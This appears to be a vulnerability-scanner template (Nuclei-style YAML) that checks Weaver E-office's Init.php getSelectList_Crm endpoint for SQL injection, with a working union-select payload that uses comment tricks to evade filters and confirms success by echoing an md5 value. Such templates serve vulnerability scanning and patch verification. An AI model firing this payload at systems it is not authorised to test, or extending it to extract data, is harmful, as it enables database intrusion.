id: poc-yaml-weaver-e-office-getSelectList-sqli
info:
  name: 泛微 E-office 办公系统 Init.php getSelectList_Crm SQL 注入漏洞
  author: ProjectDiscoveryAI
  severity: high
  tags: sql-injection

variables:
  v1: "{{rand_int(1000, 10000)}}"

http:
  - raw:
      - |
        POST /E-mobile/App/Init.php?m=getSelectList_Crm HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        cc_parent_id=-999 /*!50000union*/ /*!50000all*/ /*!50000select*/ 1,(/*!50000select*/ md5({{v1}}))#

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "\"CC_VALUE\":\""
      - type: word
        part: body
        words:
          - "{{md5(v1)}}"
